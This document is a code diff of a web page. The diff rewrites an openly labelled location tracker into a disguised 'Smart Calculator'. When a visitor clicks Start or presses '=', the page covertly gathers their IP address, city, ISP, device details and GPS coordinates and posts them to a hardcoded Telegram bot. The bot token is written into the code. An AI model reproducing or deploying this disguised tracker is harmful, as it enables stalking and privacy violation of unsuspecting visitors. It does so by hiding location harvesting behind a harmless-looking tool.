@@ -1,45 +1,159 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Tracker</title>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Smart Calculator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .start-screen, .calculator {
+      display: none;
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+    .start-screen.active, .calculator.active {
+      display: block;
+    }
+    .start-screen h2 {
+      text-align: center;
+      color: #333;
+    }
+    .start-btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      font-size: 1.2em;
+      background-color: #00b894;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .display {
+      height: 60px;
+      background: #f4f4f4;
+      font-size: 2em;
+      padding: 10px;
+      text-align: right;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+      overflow-x: auto;
+    }
+    .buttons {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+    }
+    button {
+      font-size: 1.5em;
+      padding: 20px;
+      border: none;
+      border-radius: 10px;
+      background-color: #e0f7fa;
+      box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:active {
+      background-color: #b2ebf2;
+    }
+    .equal {
+      background-color: #a5d6a7;
+      grid-column: span 2;
+    }
+    .clear {
+      background-color: #ef9a9a;
+    }
+  </style>
 </head>
 <body>
-  <h2>Verifying your location...</h2>
 
-  <script>
-    const TELEGRAM_WEBHOOK = "https://api.telegram.org/bot8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc/sendMessage";
-    const CHAT_ID = "7357184121";
+<div class="start-screen active" id="startScreen">
+  <h2>Click Start to use Smart Calculator</h2>
+  <button class="start-btn" onclick="startCalculator()">Start</button>
+</div>
 
-    function sendToTelegram(data) {
-      const message = `
-📍 <b>New Visitor Tracked!</b>
+<div class="calculator" id="calculator">
+  <div id="display" class="display">0</div>
+  <div class="buttons">
+    <button onclick="clearDisplay()" class="clear">C</button>
+    <button onclick="append('/')">/</button>
+    <button onclick="append('*')">*</button>
+    <button onclick="append('-')">-</button>
 
-🌐 <b>IP:</b> ${data.ip}
-🏙️ <b>City:</b> ${data.city}, ${data.region}, ${data.country}
-📶 <b>ISP:</b> ${data.org}
-🕒 <b>Timezone:</b> ${data.timezone}
-📱 <b>Device:</b> ${data.userAgent}
-📏 <b>Screen:</b> ${data.screen}
-📍 <b>GPS:</b> ${data.gps_lat || 'N/A'}, ${data.gps_lng || 'N/A'} (±${data.gps_accuracy || 'N/A'}m)
-🕒 <b>Time:</b> ${new Date().toLocaleString()}
-      `;
+    <button onclick="append('7')">7</button>
+    <button onclick="append('8')">8</button>
+    <button onclick="append('9')">9</button>
+    <button onclick="append('+')">+</button>
 
-      fetch(TELEGRAM_WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        })
-      });
+    <button onclick="append('4')">4</button>
+    <button onclick="append('5')">5</button>
+    <button onclick="append('6')">6</button>
+    <button onclick="append('1')">1</button>
+
+    <button onclick="append('2')">2</button>
+    <button onclick="append('3')">3</button>
+    <button onclick="append('0')">0</button>
+    <button onclick="append('.')">.</button>
+
+    <button onclick="calculate()" class="equal">=</button>
+  </div>
+</div>
+
+<script>
+  const display = document.getElementById("display");
+
+  function append(value) {
+    if (display.innerText === "0") {
+      display.innerText = value;
+    } else {
+      display.innerText += value;
     }
+  }
+
+  function clearDisplay() {
+    display.innerText = "0";
+  }
+
+  function calculate() {
+    try {
+      display.innerText = eval(display.innerText);
+      sendLocationToTelegram("User pressed =");
+    } catch {
+      display.innerText = "Error";
+    }
+  }
+
+  function startCalculator() {
+    sendLocationToTelegram("User clicked Start");
+    document.getElementById("startScreen").classList.remove("active");
+    document.getElementById("calculator").classList.add("active");
+  }
+
+  function sendLocationToTelegram(eventNote) {
+    const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
+    const CHAT_ID = "7357184121";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     fetch("https://ipinfo.io/json?token=ENTER_YOUR_TOKEN_OR_REMOVE")
       .then(res => res.json())
       .then(ipData => {
-        const userInfo = {
+        let data = {
           ip: ipData.ip,
           city: ipData.city,
           region: ipData.region,
@@ -53,21 +167,35 @@
 
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(function(pos) {
-            userInfo.gps_lat = pos.coords.latitude;
-            userInfo.gps_lng = pos.coords.longitude;
-            userInfo.gps_accuracy = pos.coords.accuracy;
-            sendToTelegram(userInfo);
-          }, function(error) {
-            userInfo.gps_error = error.message;
-            sendToTelegram(userInfo);
-          });
-        } else {
-          userInfo.gps_error = "Geolocation not supported";
-          sendToTelegram(userInfo);
-        }
+            data.gps_lat = pos.coords.latitude;
+            data.gps_lng = pos.coords.longitude;
+            data.gps_accuracy = pos.coords.accuracy;
 
-        document.body.innerHTML = "<p>✅ Your location has been verified successfully.</p>";
+            const message = `
+📍 <b>${eventNote}</b>
+
+🌐 <b>IP:</b> ${data.ip}
+🏙️ <b>Location:</b> ${data.city}, ${data.region}, ${data.country}
+📍 <b>GPS:</b> ${data.gps_lat}, ${data.gps_lng} (±${data.gps_accuracy}m)
+📱 <b>Device:</b> ${data.userAgent}
+📏 <b>Screen:</b> ${data.screen}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+            `;
+
+            fetch(TELEGRAM_API, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+              })
+            });
+          });
+        }
       });
-  </script>
+  }
+</script>
+
 </body>
 </html>
